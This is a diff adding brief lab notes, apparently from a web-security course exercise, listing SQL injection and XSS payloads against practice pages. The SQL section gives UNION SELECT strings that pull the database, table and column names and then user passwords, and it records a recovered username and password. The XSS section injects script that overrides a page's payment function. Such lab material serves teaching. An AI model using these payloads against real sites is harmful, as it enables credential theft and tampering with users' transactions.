@@ -1,0 +1,36 @@
+SQL INJECTION
+http://uwinfo344.chunkaiw.com/trysqlinjection.php?bookid=1
+Returns id, name, and price columns
+
+To steal database namem, request database name and match the number of columns:
+?bookid=1 union select database(), 0, 0
+database = info344sqlinject
+
+To get all table names:
+?bookid=1 union select 0, TABLE_NAME, 0 from INFORMATION_SCHEMA.TABLES
+
+To get column names:
+?bookid=1 union (select column_name, 0, 0 from information_schema.columns where table_schema = 'info344sqlinject' and table_name='users')
+
+from Users table:
+?bookid=1 union select 0, password, 0 From Users
+username: ck
+password: justinbieber
+
+
+
+
+
+CROSS SITE SCRIPTING (XSS)
+http://uwinfo344.chunkaiw.com/tryxssattack.php?name=Joe
+
+To override js:
+?name=Joe <script>alert('hi')</script>
+
+To override the alert function, view the page's js to find the function name. The "+" symbol must be encoded as "%2b".
+Add the following script:
+<script>
+    function sendPayment(amount) {
+        alert('you just paid Elliot $' %2b (amount * 1000));
+    }
+</script>
